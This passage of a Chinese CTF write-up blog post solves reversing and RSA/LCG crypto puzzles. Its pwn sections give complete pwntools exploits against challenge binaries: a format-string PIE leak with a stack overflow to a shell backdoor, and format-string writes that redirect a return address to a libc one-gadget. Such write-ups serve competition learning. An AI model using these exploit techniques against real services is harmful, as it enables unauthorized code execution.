+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># output = &#x27;=1nb0A3b7AUQwB3b84mQ/E0MvJUb+EXbx5TQwF3bt52bAZncsd9c&#x27;</span></span><br><span class="line"><span class="comment"># output = output.replace(&#x27;1&#x27;, &#x27;g&#x27;).replace(&#x27;3&#x27;, &#x27;H&#x27;).replace(&#x27;9&#x27;, &#x27;W&#x27;)</span></span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line">output = <span class="string">&#x27;=gnb0AHb7AUQwBHb84mQ/E0MvJUb+EXbx5TQwFHbt52bAZncsdWc&#x27;</span></span><br><span class="line">a=<span class="string">&#x27;qglrv@onmlqpA&gt;qmq&gt;mBo3A?Bn&lt;lppA@;lp4nx&#x27;</span></span><br><span class="line"></span><br><span class="line">list1 = <span class="built_in">list</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">  list1[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list1[i]) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">  list1[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list1[i]) - <span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">  list1[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list1[i])^<span class="number">8</span>)</span><br><span class="line">  <span class="built_in">print</span>(list1[i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag，<strong>flag{5dcbafe63fbf3b7d8647c1aee650ae9c}</strong></p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="HaM3"><a href="#HaM3" class="headerlink" title="HaM3"></a>HaM3</h3><p>已知p ∗ q 的高19位和低18位</p>
+<p>而p ∗ q的总位数为39</p>
+<p>剩下两位需要爆破一下</p>
+<p>由于p ∗ q 不大，可以直接用sagemath的factor()分解</p>
+<p>然后爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">64</span></span><br><span class="line">n = </span><br><span class="line">high = <span class="built_in">str</span>(n)[:<span class="number">19</span>]</span><br><span class="line">low = <span class="built_in">str</span>(n)[-<span class="number">18</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">     pq = <span class="built_in">int</span>(high + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j) + low)</span><br><span class="line">     f = factor(pq)</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">len</span>(f) == <span class="number">2</span> <span class="keyword">and</span> f[<span class="number">0</span>][<span class="number">0</span>].nbits() == <span class="number">64</span>: </span><br><span class="line">       p = f[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">       q = f[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">       <span class="built_in">print</span>(p,q)</span><br></pre></td></tr></table></figure>
+
+<p>然后得到pq以后根据原来的代码去解码就可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p,q = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">P = <span class="built_in">int</span>(<span class="built_in">str</span>(p) + <span class="built_in">str</span>(q))</span><br><span class="line">Q = <span class="built_in">int</span>(<span class="built_in">str</span>(q) + <span class="built_in">str</span>(p))</span><br><span class="line">PP = <span class="built_in">int</span>(<span class="built_in">str</span>(P) + <span class="built_in">str</span>(Q))</span><br><span class="line">QQ = <span class="built_in">int</span>(<span class="built_in">str</span>(Q) + <span class="built_in">str</span>(P))</span><br><span class="line">phi = (PP-<span class="number">1</span>)*(QQ-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,PP*QQ)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="奇怪的sar"><a href="#奇怪的sar" class="headerlink" title="奇怪的sar"></a>奇怪的sar</h3><p>第一步是lcg得到初始seed</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">137670797028117726329534659376416493367957852768263083700434198723955223922183386928456013703791817601151754417828367188186912209697081337658512940425529211281290630976671911327606706953154608427885071841566358882014021242768190762103365969320014710368160869517966437591299370072284930202718943785099916898209</span></span><br><span class="line"></span><br><span class="line">output = [<span class="number">101737402423360536260958229788866250367716256968287178187558336481872788309727545478736771692477306412259739856568227009850831432381180909815512654609798228982433082928392936844193974517574281026029228179913579225687286945054175762659252515268270399329404664775893089132101252158524000295899895962104782878103</span>, <span class="number">37355684997487259669354747104430314505839306993101096210478266975184357608742619438151118843905165289324251734149329596611854110739738607745107961453008343886403511257039401245484528985856920723694142989180291902939107642020398816995584650913417698279936585230648639613028793148102494100898288564799111024672</span>, <span class="number">58677759595639211550435023449462812079890625834313820227189340593596480924226619376872336960357021314847975570175387751632125898437020801920862764666175594874885587518469384576361008639967382152477408865298759987606155830674598034578657554841283906976808719095766296677147076808250022898199866472085742989883</span>, <span class="number">61841632061818470036288407041172200048676249787061823756736224887116113640875444187463656719652972233582538657844183320242896612625995507633237074900538692102956750184024574603018257213912795847625926653585010890014291951218199774765624860625726555381815237888483974246173727262881650634287497285246796321130</span>, <span class="number">7618244158597756867387754433401378508070531356170836765779245254233413235386172690733378371343899289510629513166609513857423499004879497768588665836034791151090648182168421570449377835494883902907064269417199065924565304966242954268460876762295575715334403142360198583318323418975108290758222653083011275844</span>, <span class="number">106276841058222138994123556391380518368163552919305398852484130331884811278068151915582752795463570013359693610495645946230044828403849434903415989487924763756589202218361370725532394478569304449884620166937809374355282324069422109879874964479199929174533104879048175102339134830614476339153367475243140156049</span>, <span class="number">54574757236475194407137831004617398270525645136836468973535243574661043352422598443323384197261529289829451787586618886007968913414366545291507686451774653217577858375086817168124727394445167274831801876424578654786480330913650363551771258617533162477541882336257099777912519011890593910515860435759936717781</span>, <span class="number">15567087904962670212229825713697043597876172881256160613623383896576159414077875401117959132252949501643234465895697270909085179587988268864498823765197994781747034644583869111599516151129007414228897958635533561248099927507725880289417298814703767549313482346652043188826434944367260731729064673486516315207</span>, <span class="number">10757138067445225320504771816863593606847219020279502671965413470243269270456133564739090471033889069283122519782525412134604896073598293410977787230108853737796640474070194546344190858079847734817109910030714675258996740807873872365037296486121580542250452443305370358407408558223735250474249180772656905880</span>, <span class="number">68097848963949068260912124852455363245291187860801223898468533992003737157497436432969031551088942445561676359631354280979357356539429863946694570097104716411407829017684705171462511875250672979623888463245258237680782731827727876526411531354910982579164963119481534453651300645314177478026462894232377307020</span>]</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line">a=(output[<span class="number">2</span>]-output[<span class="number">1</span>])*MMI((output[<span class="number">1</span>]-output[<span class="number">0</span>]),n)%n</span><br><span class="line">ani=MMI(a,n)</span><br><span class="line">b=(output[<span class="number">1</span>]-a*output[<span class="number">0</span>])%n</span><br><span class="line">seed = (ani*(output[<span class="number">0</span>]-b))%n</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br></pre></td></tr></table></figure>
+
+<p>因为seed和n都是与pq有关，直接爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">N = </span><br><span class="line">seed = </span><br><span class="line">seed &lt;&lt;=<span class="number">400</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">ok = <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_xor</span>(<span class="params">tp,tq,idx</span>):</span><br><span class="line">  <span class="keyword">global</span> ok </span><br><span class="line">  <span class="keyword">if</span> ok:</span><br><span class="line">     <span class="keyword">return</span> </span><br><span class="line">  <span class="keyword">if</span> tp*tq&gt;N:</span><br><span class="line">     <span class="keyword">return</span> </span><br><span class="line">  <span class="keyword">if</span> (tp+(<span class="number">2</span>&lt;&lt;idx))*(tq+(<span class="number">2</span>&lt;&lt;idx))&lt;N:</span><br><span class="line">     <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> idx&lt;=<span class="number">400</span>:</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">       f = tp + x </span><br><span class="line">       rr = f.monic().small_roots(X=<span class="number">2</span>^<span class="number">400</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">       <span class="keyword">if</span> rr != []:</span><br><span class="line">         <span class="built_in">print</span>(rr)</span><br><span class="line">         <span class="built_in">print</span>(tp)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>,f(rr[<span class="number">0</span>]))</span><br><span class="line">         ok = <span class="literal">True</span></span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  idx -=<span class="number">1</span></span><br><span class="line">  b = (seed &gt;&gt;idx)&amp;<span class="number">1</span></span><br><span class="line">  one = <span class="number">1</span>&lt;&lt;idx </span><br><span class="line">  <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">     pq_xor(tp,tq,idx)   </span><br><span class="line">     pq_xor(tp+one,tq+one,idx)   </span><br><span class="line">  <span class="keyword">else</span>:  <span class="comment">#1</span></span><br><span class="line">     pq_xor(tp+one,tq,idx)</span><br><span class="line">     pq_xor(tp,tq+one,idx)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">tp = <span class="number">1</span>&lt;&lt;<span class="number">1023</span></span><br><span class="line">tq = <span class="number">1</span>&lt;&lt;<span class="number">1023</span></span><br><span class="line">pq_xor(tp,tq,<span class="number">1023</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后就是最简单的rsa</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="陕西游玩"><a href="#陕西游玩" class="headerlink" title="陕西游玩"></a>陕西游玩</h3><p>Terra_Cotta_Warriors函数存在格式化字符串漏洞，可以利用它泄露PIE基地址。Huashan_Mountain函数存在栈溢出，而且0x129A上有system(“&#x2F;bin&#x2F;sh”)，可以直接覆盖返回地址执行后门。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io = remote()</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&quot;Welcome to Terra_Cotta_Warriors\n&quot;</span>, <span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recvline(keepends=<span class="literal">False</span>),<span class="number">16</span>) - <span class="number">0x106</span></span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(backdoor)</span><br><span class="line">sla(<span class="string">&quot;Welcome to Huashan_Mountain\n&quot;</span>,payload)</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="eazy-printf"><a href="#eazy-printf" class="headerlink" title="eazy_printf"></a>eazy_printf</h3><p>base64解密文得出“TokameinE_is_the_best_pwner”，fmtstr函数有bss上的格式化字符串漏洞，而且可以使用13次，所以可以泄露libc，并且找栈上的多重指针，覆盖main函数返回地址为onegadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Do you know who the best pwner is?\n&quot;</span>,<span class="string">b&#x27;TokameinE_is_the_best_pwner&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">5</span>)</span><br><span class="line">sda(<span class="string">&quot;What do you want to say?\n&quot;</span>,<span class="string">b&#x27;%10$p.%29$p.&#x27;</span>)</span><br><span class="line">stack1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;.&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)+<span class="number">0x8</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;.&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20840</span></span><br><span class="line">success(<span class="string">&quot;stack1:&quot;</span>+<span class="built_in">hex</span>(stack1))</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one = <span class="number">0xf1247</span> + libc_base</span><br><span class="line">success(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">payload1 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(stack1 &amp; <span class="number">0xFFFF</span>).encode() + <span class="string">b&#x27;d%31$hn&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(one &amp; <span class="number">0xFFFF</span>).encode() + <span class="string">b&#x27;d%57$hn&#x27;</span></span><br><span class="line">payload3 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack1 &amp; <span class="number">0xffff</span>) + <span class="number">2</span>).encode() + <span class="string">b&#x27;d%31$hn&#x27;</span></span><br><span class="line">payload4 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((one &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;d%57$hn&#x27;</span></span><br><span class="line">sda(<span class="string">&quot;What do you want to say?\n&quot;</span>,payload1)</span><br><span class="line">sda(<span class="string">&quot;What do you want to say?\n&quot;</span>,payload2)</span><br><span class="line">sda(<span class="string">&quot;What do you want to say?\n&quot;</span>,payload3)</span><br><span class="line">sda(<span class="string">&quot;What do you want to say?\n&quot;</span>,payload4)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">  sda(<span class="string">&quot;What do you want to say?\n&quot;</span>,<span class="string">b&#x27;Eureka&#x27;</span>*<span class="number">5</span>)</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/misc/" rel="tag"><i class="fa fa-tag"></i> misc</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+              <a href="/tags/re/" rel="tag"><i class="fa fa-tag"></i> re</a>
+              <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i> crypto</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/05/LitCTF/" rel="prev" title="LitCTF">
+                  <i class="fa fa-chevron-left"></i> LitCTF
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/05/cc%E9%93%BE/" rel="next" title="CC链">
+                  CC链 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
